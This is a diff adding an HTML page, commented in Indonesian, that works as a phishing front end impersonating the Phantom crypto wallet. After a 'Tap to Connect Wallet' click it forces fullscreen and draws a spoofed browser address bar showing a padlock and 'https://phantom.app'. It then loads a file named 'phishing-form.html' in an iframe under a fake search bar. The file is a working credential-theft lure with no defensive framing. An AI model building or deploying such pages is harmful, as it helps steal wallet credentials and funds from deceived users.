@@ -1,0 +1,170 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Secure Login — Mobile-style Bottom Search</title>
+  <style>
+    :root {
+      --top-bar-height: 40px;
+      --bottom-bar-height: 56px;
+      --bg: #ffffff;
+      --muted: #f1f1f1;
+      --accent: #111;
+      --input-radius: 12px;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background: var(--bg);
+      -webkit-font-smoothing:antialiased;
+    }
+
+    /* Spoofed address bar at top (keadaan tampil setelah trigger) */
+    .addressbar-spoof {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: var(--top-bar-height);
+      background: var(--muted);
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+      font-size: 14px;
+      z-index: 9999;
+      box-sizing: border-box;
+      gap: 8px;
+    }
+    .secure { color: green; font-weight: 700; margin-right: 6px; }
+
+    /* Iframe mengisi area antara top bar & bottom search bar */
+    iframe {
+      position: absolute;
+      top: var(--top-bar-height);
+      left: 0;
+      width: 100%;
+      height: calc(100% - var(--top-bar-height) - var(--bottom-bar-height));
+      border: none;
+      box-sizing: border-box;
+    }
+
+    /* Bottom mobile-style search bar */
+    .search-bar {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      height: var(--bottom-bar-height);
+      display: flex;
+      align-items: center;
+      padding: 8px 12px;
+      box-sizing: border-box;
+      background: #fff;
+      border-top: 1px solid rgba(0,0,0,0.06);
+      z-index: 10000;
+      gap: 8px;
+      box-shadow: 0 -6px 20px rgba(0,0,0,0.06);
+    }
+
+    .search-input {
+      flex: 1;
+      height: 40px;
+      border-radius: var(--input-radius);
+      border: 1px solid rgba(0,0,0,0.08);
+      padding: 0 12px;
+      font-size: 15px;
+      outline: none;
+      box-sizing: border-box;
+    }
+    .search-btn {
+      height: 40px;
+      min-width: 44px;
+      padding: 0 14px;
+      border-radius: 10px;
+      border: none;
+      background: var(--accent);
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    /* initial center trigger button (before membuka iframe) */
+    #trigger {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 18px;
+      padding: 18px 22px;
+      background: var(--accent);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    /* Small screens tweak */
+    @media (max-width: 480px) {
+      .search-input { font-size: 16px; }
+      #trigger { padding: 16px 18px; font-size: 16px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Tombol awal -->
+  <button id="trigger">Tap to Connect Wallet</button>
+
+  <script>
+    const trigger = document.getElementById('trigger');
+
+    trigger.onclick = () => {
+      // Template HTML yang akan menggantikan body (addressbar + iframe + bottom search bar)
+      document.body.innerHTML = `
+        <div class="addressbar-spoof">
+          <span class="secure">🔒</span>
+          <span class="domain">https://phantom.app</span>
+        </div>
+
+        <iframe id="mainFrame" src="phishing-form.html" title="content frame"></iframe>
+
+        <div class="search-bar" role="search">
+          <input id="searchInput" class="search-input" type="search" inputmode="search"
+                 placeholder="Cari (ketik lalu tekan Cari)" aria-label="Cari">
+          <button id="searchBtn" class="search-btn" aria-label="Cari">Cari</button>
+        </div>
+      `;
+
+      // Coba masuk fullscreen (jika diizinkan)
+      document.documentElement.requestFullscreen?.().catch(()=>{ /* ignore */ });
+
+      // Hook handler untuk fungsi pencarian
+      const frame = document.getElementById('mainFrame');
+      const input = document.getElementById('searchInput');
+      const btn = document.getElementById('searchBtn');
+
+      // Jika user tekan Enter di input -> lakukan pencarian
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') doSearch();
+      });
+      btn.addEventListener('click', doSearch);
+
+      function doSearch() {
+        const q = input.value.trim();
+        if (!q) {
+          input.focus();
+          return;
+        }
+      
+        const url = 'search-results.html?q=' + encodeURIComponent(q);
+        frame.src = url;
+
+      }
+    };
+  </script>
+</body>
+</html>
